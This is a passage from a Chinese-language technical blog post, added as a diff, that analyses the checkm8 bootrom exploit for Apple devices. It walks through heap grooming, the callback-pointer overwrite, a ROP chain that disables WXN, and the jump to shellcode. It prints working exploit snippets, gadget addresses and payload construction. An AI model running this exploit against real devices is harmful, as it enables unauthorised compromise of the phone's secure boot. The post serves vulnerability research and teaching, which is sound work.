+	<span class="n">io_request</span> <span class="o">=</span> <span class="n">alloc_ep0_device_io_request</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+	<span class="p">......</span>
+	
+  <span class="c1">//加入EP0端点的IO队列</span>
+	<span class="n">usb_controller_do_endpoint_io</span><span class="p">(</span><span class="n">io_request</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>堆风水的目的是形成两个zlp对象卡位，这样第二轮getDFUImage的堆布局就会发生变化，此时往ep0_data_phase_buffer指向的缓冲区写数据就会造成堆溢出，覆盖usb_device_io_request对象的callback和next指针。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%A0%86%E9%A3%8E%E6%B0%B4.jpg" alt="checkm8-堆风水.jpg" /></p>
+
+<h2 id="堆模拟器">堆模拟器</h2>
+
+<p>在第二轮getDFUImage中向ep0_data_phase_buffer指向的缓冲区写入多少字节可以抵达usb_device_io_request对象？</p>
+
+<p>在分配usb_device_io_request对象之前，getDFUImage先分配一些对象：</p>
+
+<ul>
+  <li>分配各种字符串描述符
+    <ul>
+      <li>Nonce（234字节）</li>
+      <li>Manufacturer（22字节）</li>
+      <li>Product（62字节）</li>
+      <li>Serial Number（198字节）</li>
+      <li>Configuration string （62字节）</li>
+    </ul>
+  </li>
+  <li>USB任务资源
+    <ul>
+      <li>synopsys_otg_task任务的task structure（0x3C0字节）</li>
+      <li>synopsys_otg_task任务的栈（0x1000字节）</li>
+    </ul>
+  </li>
+  <li>io_buffer（0x800字节）</li>
+  <li>配置描述符
+    <ul>
+      <li>High-Speed（25字节）</li>
+      <li>Full-Speed（25字节）</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E8%A6%86%E7%9B%96%E8%B7%9D%E7%A6%BB.jpg" alt="checkm8-覆盖距离.jpg" /></p>
+
+<p>把堆的实现代码拿到Ubunut22.04下进行重构，模拟上述初始化过程的对象分配，计算出覆盖距离：
+为0x5C0。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-13_14.40.01.png" alt="截屏2025-03-13 14.40.01.png" /></p>
+
+<h2 id="控制流劫持">控制流劫持</h2>
+
+<p>libusb1_async_ctrl_transfer向设备发起DFU_DNLOAD请求，在等待0.0001秒之后取消数据传输。在此过程中handle_interface_request函数把io_buffer指针赋值给ep0_data_phase_buffer。</p>
+
+<p>libusb1_no_error_ctrl_transfer向设备发出DFU_CLR_STATUS请求，getDFUImage释放USB资源，2个zlp对象驻留在堆上面。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nf">libusb1_async_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x800</span><span class="p">,</span> <span class="mf">0.0001</span><span class="p">)</span>
+  <span class="nf">libusb1_no_error_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1">#触发漏洞
+</span></code></pre></div></div>
+
+<p>这两步完成之后堆的布局如下：</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_23_%E9%A1%B5.jpg" alt="checkm8-第 23 页.jpg" /></p>
+
+<p>usb_req_leak会在第二轮getDFUImage过程中在堆上申请到一个usb_device_io_request对象用于被覆盖。</p>
+
+<p>覆盖到callback和next指针的距离是0x5E0，分别用t8010_nop_gadget和0x1800B0800覆盖callback和next指针。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">t8010_nop_gadget</span> <span class="o">=</span> <span class="mh">0x10000CC6C</span>
+<span class="n">t8010_overwrite</span> <span class="o">=</span> <span class="sh">'</span><span class="se">\0</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x5c0</span> <span class="o">+</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;32x2Q</span><span class="sh">'</span><span class="p">,</span> \
+											<span class="n">t8010_nop_gadget</span><span class="p">,</span> <span class="mh">0x1800B0800</span><span class="p">)</span>
+											
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">leak</span><span class="p">):</span> <span class="c1"># for i in range(1)
+</span>	<span class="nf">usb_req_leak</span><span class="p">(</span><span class="n">device</span><span class="p">)</span>       <span class="c1"># 分配usb_device_io_request对象被覆盖
+</span>
+<span class="c1">#覆盖usb_device_io_request对象的callback和next指针
+</span><span class="nf">libusb1_no_error_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">t8010_overwrite</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>向设备发送重置命令，设备进入到USB重置流程，执行synopsys_otg_abort_endpoint函数，释放io链表上面的所有usb_device_io_request对象。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>
+
+	<span class="p">......</span>
+	
+	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>
+	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	
+	<span class="p">......</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
+		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
+		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>在释放usb_device_io_request对象之前，会调用usb_device_io_request::callback回调函数控制流被劫持到t8010_nop_gadget。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">){</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="p">}</span>
+    
+	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h1 id="rop过程分析">ROP过程分析</h1>
+
+<h2 id="拷贝rop链">拷贝ROP链</h2>
+
+<p>向手机发送bmRequest=0x21，bRequest=1的数据传输Transaction，开始DFU下载过程，payload最终会拷贝到INSECURE_MEMORY区域。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="n">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mh">0x800</span><span class="p">)</span><span class="o">:</span>
+    <span class="n">libusb1_no_error_ctrl_transfer</span><span class="p">(</span><span class="n">device</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="o">:</span><span class="n">i</span><span class="o">+</span><span class="mh">0x800</span><span class="p">],</span> <span class="mi">100</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>payload被拆分成为2次Transaction进行传输，每个Transaction分别写入发送2048字节和352字节。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E5%8F%91%E9%80%81payload%E6%8A%93%E5%8C%85.png" alt="发送payload抓包.png" /></p>
+
+<p>payload的构造函数如下，包含了shellcode、伪造页表项、关闭WXN的指令片段、ROP链。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">payload</span><span class="p">(</span><span class="n">cpid</span><span class="p">):</span>
+	<span class="k">return</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;1024sQ504x2Q496s32x</span><span class="sh">'</span><span class="p">,</span> <span class="n">t8010_shellcode</span><span class="p">,</span> \
+	<span class="mh">0x1000006A5</span><span class="p">,</span> <span class="mh">0x60000180000625</span><span class="p">,</span> <span class="mh">0x1800006A5</span><span class="p">,</span> \
+	<span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">'</span><span class="s">t8010_t8011_disable_wxn_arm64</span><span class="sh">'</span><span class="p">))</span> \
+	<span class="o">+</span> <span class="nf">usb_rop_callbacks</span><span class="p">(</span><span class="mh">0x1800B0800</span><span class="p">,</span> <span class="n">t8010_func_gadget</span><span class="p">,</span> <span class="n">t8010_callbacks</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%84.jpg" alt="checkm8-rop链大概结构.jpg" /></p>
+
+<h2 id="rop链的推进">ROP链的推进</h2>
+
+<p>usb_device_io_request::next指针覆盖为0x1800B0800，指向攻击者在INSECURE_MEMORY区域构造的faka usb_device_io_request对象。</p>
+
+<p>usb_device_io_request::callback函数指针覆盖为0x10000CC6C。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_15.43.00.png" alt="截屏2025-03-10 15.43.00.png" /></p>
+
+<p>这条gadget做了一件事情，跳过free(io_req)直接回到while(aborted_list)循环，去执行下一个fake usb_device_io_request对象的callback回调函数。</p>
+
+<p>这么做的原因是，覆盖callback和next指针的过程中已经破坏了usb_device_io_request对象所在堆块的元数据，此时free就会引发panic异常。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">){</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="p">}</span>
+    
+	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>
+
+	<span class="p">......</span>
+	
+	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>
+	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	
+	<span class="p">......</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
+		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
+		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>保存usb_core_complete_endpoint_io函数返回地址的X30寄存器一开始就被保存在了栈上面，所以gadget的作用就是把X30出栈，即可直接返回到while(aborted_list)，如此就绕过了free(io_req)，避免了panic，同时把链表推进到了在INSECURE_MEMORY区域构造的fake usb_device_io_request。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_16.03.27.png" alt="截屏2025-03-10 16.03.27.png" /></p>
+
+<p>每个fake usb_device_io_request对象通过递增next指针，可实现[callback，next]序列紧密排列，while(aborted_list)循环便可以往下推进，每一轮循环调用一次callback函数指针，实现类似于rop链的功能。最后一个fake usb_device_io_request对象的next指针为NULL，表示停止循环。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%842.jpg" alt="checkm8-rop链大概结构2.jpg" /></p>
+
+<h2 id="fx指令片段">“f(x)”指令片段</h2>
+
+<p>fake usb_device_io_request对象的callback指针都是统一的func_gadget，地址为0x10000CC4C。</p>
+
+<p>callback的参数就是fake usb_device_io_request对象本身，根据aarch64函数调用的参数约定，X0寄存器保存第1个参数，因此X0保存fake usb_device_io_request对象的地址。</p>
+
+<p>因此func_gadget执行的效果是把fake usb_device_io_request对象偏移0x70处和0x78处的数据分别作为函数的参数和函数本身，进行一次f(x)调用。</p>
+
+<p>在退出func_gadget的时候，同样也是跳过free(io_req)，直接返回到synopsys_otg_abort_endpoint函数的while(aborted_list)循环中，执行下一条func_gadget。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_17.01.50.png" alt="截屏2025-03-10 17.01.50.png" /></p>
+
+<p>这么做的现实根据是什么？</p>
+
+<p>func_gadget的选取并非随机巧合，f(x)调用其实相当于对象本身方法的调用，面向对象编程思想在代码中应该会有很多地方体现。</p>
+
+<h2 id="关闭wxn">关闭WXN</h2>
+
+<p>ROP链的作用是关闭WXN，使得位于0x1800B000～0x1800B400之间的shellcode可执行。</p>
+
+<p>SecureROM在arch_cpu_init函数中使能了WXN（Write XOR eXecute Never）功能。WXN确保内存区域不能同时具有写和执行权限。如果一个内存区域被标记为可写，则不能同时标记为可执行，反之亦然。当WXN启用时，处理器会自动将可写内存区域标记为不可执行，防止恶意代码通过写入内存并执行来攻击系统。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">arch_cpu_init</span><span class="p">(</span><span class="n">bool</span> <span class="n">resume</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="p">......</span>
+	
+	<span class="kt">uint64_t</span> <span class="n">sctlr</span><span class="p">;</span>
+	<span class="n">sctlr</span> <span class="o">=</span> <span class="n">arm_read_sctlr</span><span class="p">();</span>
+
+	<span class="cm">/* turn on Stack Alignment check */</span>
+	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_SA_ENABLED</span><span class="p">;</span>
+
+	<span class="cm">/* turn on the mmu */</span>
+	<span class="n">arm_mmu_init</span><span class="p">(</span><span class="n">resume</span><span class="p">);</span>
+	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_M_ENABLED</span><span class="p">;</span>
+
+	<span class="cm">/* disallow executing from writeable pages */</span>
+	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_WXN_ENABLED</span><span class="p">;</span><span class="c1">//使能WXN</span>
+
+	<span class="cm">/* turn on d-cache */</span>
+	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_D_ENABLED</span><span class="p">;</span>
+
+	<span class="cm">/* turn on i-cache */</span>
+	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_I_ENABLED</span><span class="p">;</span>
+
+	<span class="cm">/* enable the MMU, caches and etc. */</span>
+	<span class="n">arm_write_sctlr</span><span class="p">(</span><span class="n">sctlr</span><span class="p">);</span>
+	
+	<span class="p">......</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>ROP链中使用到的地址如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t8010_func_gadget</span> <span class="o">=</span> <span class="mh">0x10000CC4C</span>
+<span class="n">t8010_enter_critical_section</span> <span class="o">=</span> <span class="mh">0x10000A4B8</span>
+<span class="n">t8010_exit_critical_section</span> <span class="o">=</span> <span class="mh">0x10000A514</span>
+<span class="n">t8010_dc_civac</span> <span class="o">=</span> <span class="mh">0x10000046C</span>
+<span class="n">t8010_write_ttbr0</span> <span class="o">=</span> <span class="mh">0x1000003E4</span>
+<span class="n">t8010_tlbi</span> <span class="o">=</span> <span class="mh">0x100000434</span>
+<span class="n">t8010_dmb</span> <span class="o">=</span> <span class="mh">0x100000478</span>
+<span class="n">t8010_handle_interface_request</span> <span class="o">=</span> <span class="mh">0x10000DFB8</span>
+</code></pre></div></div>
+
+<ol>
+  <li>t8010_dc_civac(0x1800B0600)</li>
+</ol>
+
+<p>使虚拟地址0x1800B0600对应的缓存行失效，确保后面CPU能正确执行disable_wxn_arm64代码。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000046</span><span class="n">C</span>                 <span class="n">DC</span>              <span class="n">CIVAC</span><span class="p">,</span> <span class="n">X0</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000470</span>                 <span class="n">RET</span>
+</code></pre></div></div>
+
+<ol>
+  <li>t8010_dmb(0)</li>
+</ol>
+
+<p>内存屏障指令，确保该指令之前的所有指令都已经执行完毕。高性能处理器会打乱指令执行的顺序，有时候需要手动同步。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000047</span><span class="mi">8</span>                 <span class="n">DMB</span>             <span class="n">SY</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000047</span><span class="n">C</span>                 <span class="n">RET</span>
+</code></pre></div></div>
+
+<ol>
+  <li>t8010_enter_critical_section(0)</li>
+</ol>
+
+<p>屏蔽中断，确保后续修改页表的操作是原子操作。</p>
+
+<ol>
+  <li>t8010_write_ttbr0(0x1800B0000)</li>
+</ol>
+
+<p>设置页表基地址寄存器TTBR0_EL1的值为0x1800B0000。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mf">00000001000003E4</span>                 <span class="n">MSR</span>             <span class="n">TTBR0_EL1</span><span class="p">,</span> <span class="n">X0</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mf">00000001000003E8</span>                 <span class="n">ISB</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">00000001000003</span><span class="n">EC</span>                 <span class="n">RET</span>
+</code></pre></div></div>
+
+<p>攻击者写入INSECURE_MEMORY区域的payload也被视为页表。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E4%BC%AA%E9%80%A0%E9%A1%B5%E8%A1%A8.jpg" alt="checkm8-伪造页表.jpg" /></p>
+
+<p>上文提到SecureROM把MMU配置为使用2级页表，16KB页面。</p>
+
+<p>0x100000000 -&gt; 0x100000000 (rx)和0x180000000 -&gt; 0x180000000 (rw)维持原地址映射关系不变，确保代码段能正常执行。</p>
+
+<p>0x182000000 -&gt; 0x180000000 (rx)是攻击者新增的页表项，作用是将payload单独映射成一个具有执行权限的段，下步可以执行disable_wxn_arm64指令。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%81%9A%E4%BA%86%E4%B8%A4%E4%BB%BD%E6%98%A0%E5%B0%84.jpg" alt="checkm8-做了两份映射.jpg" /></p>
+
+<p>那么攻击者为什么不直接修改0x180000000 -&gt; 0x180000000 (rx)呢？</p>
+
+<p>答：因为在执行disable_wxn_arm64关闭WXN之前，R(读)和X(执行)只能同时拥有一个，如果直接设置0x180000000 -&gt; 0x180000000 (rx)，后续disable_wxn_arm64中就无法对旧的页表进行修改，上文提到旧的L2页表位于0x1800A0000。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                       <span class="n">VA</span>             <span class="n">PA</span>
+<span class="p">...</span>
+<span class="mh">0x1800B0400</span><span class="o">:</span> <span class="mh">0x1000006a5</span>           <span class="mh">0x100000000</span> <span class="o">-&gt;</span> <span class="mh">0x100000000</span> <span class="p">(</span><span class="n">rx</span><span class="p">)</span>
+<span class="p">...</span>
+<span class="mh">0x1800B0600</span><span class="o">:</span> <span class="mh">0x60000180000625</span>      <span class="mh">0x180000000</span> <span class="o">-&gt;</span> <span class="mh">0x180000000</span> <span class="p">(</span><span class="n">rw</span><span class="p">)</span>
+<span class="mh">0x1800B0608</span><span class="o">:</span> <span class="mh">0x1800006a5</span>           <span class="mh">0x182000000</span> <span class="o">-&gt;</span> <span class="mh">0x180000000</span> <span class="p">(</span><span class="n">rx</span><span class="p">)</span>
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>页表项后缀为0x6a5表示读/执行权限，指向块类型页面。在2级页表，16KB页面粒度的配置下，块类型页面的大小为32MB，块类型页面是直接返回给系统使用的页面类型。</p>
+
+<p>页表项前缀为0x6后缀为0x625表示读/写权限，没有执行权限，指向块类型页面，长度为32MB。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%A1%B5%E8%A1%A8%E5%B1%9E%E6%80%A7.jpg" alt="checkm8-页表属性.jpg" /></p>
+
+<ol>
+  <li>t8010_tlbi(0)</li>
+</ol>
+
+<p>使TLB缓存记录失效，使用新的页表进行地址转换。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000434</span>                 <span class="n">DSB</span>             <span class="n">SY</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000043</span><span class="mi">8</span>                 <span class="n">TLBI</span>            <span class="n">VMALLE1</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000043</span><span class="n">C</span>                 <span class="n">DSB</span>             <span class="n">SY</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000440</span>                 <span class="n">ISB</span>
+<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000444</span>                 <span class="n">RET</span>
+</code></pre></div></div>
+
+<ol>
+  <li>0x1820B0610 — disable_wxn_arm64(0)</li>
+</ol>
+
+<p>disable_wxn_arm64指令片段起始地址0x1820B0610，映射到物理地址0x1800B0610，可执行。</p>
+
+<p>把旧的L2页表中，虚拟地址0x180000000的映射关系不变，去掉了PXN和NX位，获得了执行权限，空间长度为32MB，并且关闭了WXN。payload所在的INSECURE_MEMORY段因此也变为可读可执行。</p>
+
+<p>因为后面执行t8010_shellcode要求BOOT_TRAMPOLINE段同时具有RWX权限，因此要禁用WXN。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_09.56.28.png" alt="截屏2025-03-11 09.56.28.png" /></p>
+
+<p>在arm_mmu_init()函数初始化页表的过程中，不可执行段的页表项设置了PXN和XN比特位，在disable_wxn_arm64中把这两个位清零，使得页面具有执行权限。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_10.12.13.png" alt="截屏2025-03-11 10.12.13.png" /></p>
+
+<ol>
+  <li>t8010_write_ttbr0(0x1800A0000)</li>
+</ol>
+
+<p>恢复旧的页表。因为旧的页表中还包含设备IO寄存器地址到虚拟地址空间的映射，恢复旧页表确保系统功能正常。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.00.49.png" alt="截屏2025-03-09 13.00.49.png" /></p>
+
+<ol>
+  <li>t8010_tlbi(0)</li>
+</ol>
+
+<p>使TLB缓存记录失效，使用新的页表进行地址转换。</p>
+
+<ol>
+  <li>t8010_exit_critical_section(0)</li>
+</ol>
+
+<p>恢复中断。</p>
+
+<h2 id="跳转到shellcode执行">跳转到shellcode执行</h2>
+
+<p>经过上面的步骤，虚拟地址0x180000000～0x182000000获得RWX权限。</p>
+
+<p>while(aborted_list)循环调用最后一个callback，进入0x1800B0000执行t8010_shellcode代码。</p>
+
+<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%84-%E8%BF%9B%E5%85%A5shellcode%E8%BF%90%E8%A1%8C.jpg" alt="checkm8-rop链大概结构-进入shellcode运行.jpg" /></p>
+
+<h2 id="crauemu插件模拟rop过程">crauEmu插件模拟ROP过程</h2>
+
+<p>crauEmu是基于uEmu开发的IDA插件，相比于uEmu增加了rop调试功能，使rop过程可视化。</p>
+
+<p>这里模拟控制流劫持后，usb_rop_callbacks的执行过程。</p>
+
+<ul>
+  <li>初始设置</li>
+</ul>
+
+<p>synopsys_otg_abort_endpoint函数的while(aborted_list)循环开始ROP链的执行。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">){</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="p">}</span>
+    
+	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
+	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>
+
+	<span class="p">......</span>
+	
+	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>
+	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+	
+	<span class="p">......</span>
+
+	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
+		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
+		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
